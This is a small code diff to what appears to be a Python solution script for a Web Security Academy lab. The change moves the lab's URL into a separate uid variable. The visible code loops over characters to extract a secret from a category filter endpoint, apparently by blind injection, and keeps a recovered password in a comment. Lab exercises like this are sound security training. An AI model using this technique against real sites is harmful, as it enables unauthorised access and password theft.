@@ -2,7 +2,8 @@ import time
 import string
 import requests
 
-url = 'https://ac701f261e608c7180d738b8001800f5.web-security-academy.net/filter?category=asdf'
+uid = 'ac701f261e608c7180d738b8001800f5'
+url = 'https://' + uid + '.web-security-academy.net/filter?category=asdf'
 pwn = '' # 09tcmzjn1trwj0m2y7gs
 
 for j in range(1,100):
@@ -17,5 +18,3 @@ for j in range(1,100):
             pwn += i
             print(pwn)
             break
-
-
